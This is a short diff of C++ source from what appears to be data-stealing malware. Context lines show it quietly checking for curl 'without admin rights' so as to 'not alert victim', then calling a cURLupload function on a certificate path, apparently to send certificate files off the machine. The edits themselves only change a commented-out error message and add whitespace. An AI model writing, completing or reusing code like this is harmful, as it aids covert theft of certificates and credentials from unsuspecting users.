@@ -288,7 +288,7 @@ int cURLini()
         //using cURL without admin rights. <-- better option (Do not alert victim.)
         int testcurlnoP = system(curlPathCheck.data());
         if (testcurlnoP != 0) {
-            //std::cerr << "Error adding to PATH" << std::endl;
+            //std::cerr << "Error running curl" << std::endl;
             return 1;
         }
 
@@ -388,6 +388,7 @@ int main(int argc, _TCHAR* argv[])
         //printf("\n cURL already installed on system and added in PATH. \n");
         comandsuccess = cURLupload(check, certpath);
     }
+    
     if (comandsuccess != 0) {
         //printf("\n ERROR somewhere in cURL installing/checking \n");
     }
